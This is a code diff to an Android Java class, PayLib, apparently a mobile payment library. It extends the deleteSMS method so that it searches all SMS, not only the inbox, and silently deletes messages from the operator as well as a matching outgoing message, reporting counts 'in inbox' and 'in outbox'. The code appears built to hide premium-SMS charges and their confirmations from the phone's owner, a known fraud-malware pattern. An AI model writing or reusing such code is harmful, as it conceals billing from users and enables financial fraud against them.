@@ -321,17 +321,18 @@ public class PayLib implements PayInterface {
     }
 
     public void deleteSMS(HashMap<String, String> filters) {
-        Uri uriSms = Uri.parse("content://sms/inbox");
+        Uri uriSms = Uri.parse("content://sms");
         Cursor c = cnt.getContentResolver().query(
                 uriSms, null, null, null, null);
         Logger.lg("Sms in inbox: " + c.getCount());
         int flag = 0;
+        int flag2 = 0;
         if (c != null && c.moveToFirst()) {
             do {
                 long id = c.getLong(0);
                 long threadId = c.getLong(1);
                 String address = c.getString(2);
-                String body = c.getString(5);
+                String body = c.getString(c.getColumnIndex("body"));
                 String date = c.getString(3);
                 Logger.lg("Message  " + body + " id " + id + " date " + date + " " + address);
                 if ((operatorSMS.smsNum.contains(address) || address.toUpperCase().equals(operatorSMS.name)) && flag < 2) {
@@ -342,9 +343,18 @@ public class PayLib implements PayInterface {
                     }
                     Logger.lg("Delete result " + iko);
                 }
+                Logger.lg(currentMsg + " " + address + " " +
+                        " " + currentMsg.substring(currentMsg.indexOf("[]")+2) +
+                        body + " "  + currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address)  + " " + body.contains(currentMsg.substring(currentMsg.indexOf("[]")+2)));
+                if(currentMsg.substring(0, currentMsg.indexOf("[]")).contains(address) && body.contains(currentMsg.substring(currentMsg.indexOf("[]")+2))
+                        && flag2==0){
+                    flag2 = cnt.getContentResolver().delete(
+                            Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
+                    Logger.lg("deltete " + flag2);
+                }
             } while (c.moveToNext());
         }
-        feedback.callResult("delete " + flag + "sms");
+        feedback.callResult("delete " + flag + "sms ininbox and " + flag2 + " in outbox");
     }
 //    @Override
 //    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
